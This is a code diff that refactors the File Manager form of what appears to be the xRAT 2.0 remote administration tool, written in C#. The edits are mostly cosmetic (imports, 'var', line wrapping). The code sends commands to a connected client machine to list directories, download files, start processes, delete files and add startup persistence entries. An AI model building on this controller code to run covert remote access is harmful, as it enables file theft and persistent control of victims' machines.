@@ -4,14 +4,16 @@ using System.IO;
 using System.Windows.Forms;
 using xServer.Core;
 using xServer.Core.Misc;
+using xServer.Core.Packets.ServerPackets;
+using Directory = xServer.Core.Packets.ServerPackets.Directory;
 
 namespace xServer.Forms
 {
     public partial class FrmFileManager : Form
     {
-        private string _currentDir;
         private readonly Client _connectClient;
         private readonly ListViewColumnSorter _lvwColumnSorter;
+        private string _currentDir;
 
         public FrmFileManager(Client c)
         {
@@ -27,8 +29,9 @@ namespace xServer.Forms
         {
             if (_connectClient != null)
             {
-                this.Text = string.Format("xRAT 2.0 - File Manager [{0}:{1}]", _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
-                new Core.Packets.ServerPackets.Drives().Execute(_connectClient);
+                Text = string.Format("xRAT 2.0 - File Manager [{0}:{1}]", _connectClient.EndPoint.Address,
+                    _connectClient.EndPoint.Port);
+                new Drives().Execute(_connectClient);
             }
         }
 
@@ -47,7 +50,7 @@ namespace xServer.Forms
                     if (_connectClient.Value.LastDirectorySeen)
                     {
                         _currentDir = cmbDrives.Items[cmbDrives.SelectedIndex].ToString();
-                        new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
+                        new Directory(_currentDir).Execute(_connectClient);
                         _connectClient.Value.LastDirectorySeen = false;
                     }
                 }
@@ -60,7 +63,8 @@ namespace xServer.Forms
             {
                 if (lstDirectory.SelectedItems.Count != 0)
                 {
-                    if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir" && lstDirectory.SelectedItems[0].SubItems[0].Text == "..")
+                    if (lstDirectory.SelectedItems[0].Tag.ToString() == "dir" &&
+                        lstDirectory.SelectedItems[0].SubItems[0].Text == "..")
                     {
                         if (_connectClient.Value != null)
                         {
@@ -75,7 +79,7 @@ namespace xServer.Forms
                             if (!_currentDir.EndsWith(@"\"))
                                 _currentDir = _currentDir + @"\";
 
-                            new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
+                            new Directory(_currentDir).Execute(_connectClient);
                             _connectClient.Value.LastDirectorySeen = false;
                         }
                     }
@@ -90,7 +94,7 @@ namespace xServer.Forms
                                 else
                                     _currentDir = _currentDir + @"\" + lstDirectory.SelectedItems[0].SubItems[0].Text;
 
-                                new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
+                                new Directory(_currentDir).Execute(_connectClient);
                                 _connectClient.Value.LastDirectorySeen = false;
                             }
                         }
@@ -105,21 +109,21 @@ namespace xServer.Forms
             {
                 if (files.Tag.ToString() == "file")
                 {
-                    string path = _currentDir;
+                    var path = _currentDir;
                     if (path.EndsWith(@"\"))
                         path = path + files.SubItems[0].Text;
                     else
                         path = path + @"\" + files.SubItems[0].Text;
 
-                    int ID = new Random().Next(int.MinValue, int.MaxValue - 1337) + files.Index; // ;)
+                    var ID = new Random().Next(int.MinValue, int.MaxValue - 1337) + files.Index; // ;)
 
                     if (_connectClient != null)
                     {
-                        new Core.Packets.ServerPackets.DownloadFile(path, ID).Execute(_connectClient);
+                        new DownloadFile(path, ID).Execute(_connectClient);
 
-                        this.Invoke((MethodInvoker) delegate
+                        Invoke((MethodInvoker) delegate
                         {
-                            ListViewItem lvi = new ListViewItem(new string[] { ID.ToString(), "Downloading...", files.SubItems[0].Text });
+                            var lvi = new ListViewItem(new[] {ID.ToString(), "Downloading...", files.SubItems[0].Text});
                             lstTransfers.Items.Add(lvi);
                         });
                     }
@@ -133,14 +137,14 @@ namespace xServer.Forms
             {
                 if (files.Tag.ToString() == "file")
                 {
-                    string path = _currentDir;
+                    var path = _currentDir;
                     if (path.EndsWith(@"\"))
                         path = path + files.SubItems[0].Text;
                     else
                         path = path + @"\" + files.SubItems[0].Text;
 
                     if (_connectClient != null)
-                        new Core.Packets.ServerPackets.StartProcess(path).Execute(_connectClient);
+                        new StartProcess(path).Execute(_connectClient);
                 }
             }
         }
@@ -151,9 +155,9 @@ namespace xServer.Forms
             {
                 if (files.SubItems[0].Text != "..")
                 {
-                    string path = _currentDir;
-                    string newName = files.SubItems[0].Text;
-                    bool isDir = files.Tag.ToString() == "dir";
+                    var path = _currentDir;
+                    var newName = files.SubItems[0].Text;
+                    var isDir = files.Tag.ToString() == "dir";
 
                     if (path.EndsWith(@"\"))
                         path = path + files.SubItems[0].Text;
@@ -168,7 +172,7 @@ namespace xServer.Forms
                             newName = _currentDir + @"\" + newName;
 
                         if (_connectClient != null)
-                            new Core.Packets.ServerPackets.Rename(path, newName, isDir).Execute(_connectClient);
+                            new Rename(path, newName, isDir).Execute(_connectClient);
                     }
                 }
             }
@@ -180,19 +184,21 @@ namespace xServer.Forms
             {
                 if (files.SubItems[0].Text != "..")
                 {
-                    string path = _currentDir;
-                    bool isDir = files.Tag.ToString() == "dir";
-                    string text = string.Format("Are you sure you want to delete this {0}", (isDir) ? "directory?" : "file?");
+                    var path = _currentDir;
+                    var isDir = files.Tag.ToString() == "dir";
+                    var text = string.Format("Are you sure you want to delete this {0}",
+                        (isDir) ? "directory?" : "file?");
 
                     if (path.EndsWith(@"\"))
                         path = path + files.SubItems[0].Text;
                     else
                         path = path + @"\" + files.SubItems[0].Text;
 
-                    if (MessageBox.Show(text, "Are you sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) == DialogResult.Yes)
+                    if (MessageBox.Show(text, "Are you sure?", MessageBoxButtons.YesNo, MessageBoxIcon.Question) ==
+                        DialogResult.Yes)
                     {
                         if (_connectClient != null)
-                            new Core.Packets.ServerPackets.Delete(path, isDir).Execute(_connectClient);
+                            new Delete(path, isDir).Execute(_connectClient);
                     }
                 }
             }
@@ -204,7 +210,7 @@ namespace xServer.Forms
             {
                 if (files.Tag.ToString() == "file")
                 {
-                    string path = _currentDir;
+                    var path = _currentDir;
                     if (path.EndsWith(@"\"))
                         path = path + files.SubItems[0].Text;
                     else
@@ -215,7 +221,8 @@ namespace xServer.Forms
                         if (frm.ShowDialog() == DialogResult.OK)
                         {
                             if (_connectClient != null)
-                                new Core.Packets.ServerPackets.AddStartupItem(AutostartItem.Name, AutostartItem.Path, AutostartItem.Type).Execute(_connectClient);
+                                new AddStartupItem(AutostartItem.Name, AutostartItem.Path, AutostartItem.Type).Execute(
+                                    _connectClient);
                         }
                     }
                 }
@@ -226,19 +233,20 @@ namespace xServer.Forms
         {
             if (_connectClient != null)
             {
-                new Core.Packets.ServerPackets.Directory(_currentDir).Execute(_connectClient);
+                new Directory(_currentDir).Execute(_connectClient);
                 _connectClient.Value.LastDirectorySeen = false;
             }
         }
 
         private void btnOpenDLFolder_Click(object sender, EventArgs e)
         {
-            string downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + _connectClient.EndPoint.Address.ToString());
+            var downloadPath = Path.Combine(Application.StartupPath, "Clients\\" + _connectClient.EndPoint.Address);
 
-            if (Directory.Exists(downloadPath))
+            if (System.IO.Directory.Exists(downloadPath))
                 Process.Start(downloadPath);
             else
-                MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK, MessageBoxIcon.Information);
+                MessageBox.Show("No files downloaded yet!", "xRAT 2.0 - File Manager", MessageBoxButtons.OK,
+                    MessageBoxIcon.Information);
         }
 
         private void ctxtCancel_Click(object sender, EventArgs e)
@@ -247,7 +255,7 @@ namespace xServer.Forms
             {
                 if (!transfer.SubItems[1].Text.StartsWith("Downloading")) return;
                 if (_connectClient != null)
-                    new Core.Packets.ServerPackets.DownloadFileCanceled(int.Parse(transfer.Text)).Execute(_connectClient);
+                    new DownloadFileCanceled(int.Parse(transfer.Text)).Execute(_connectClient);
             }
         }
 
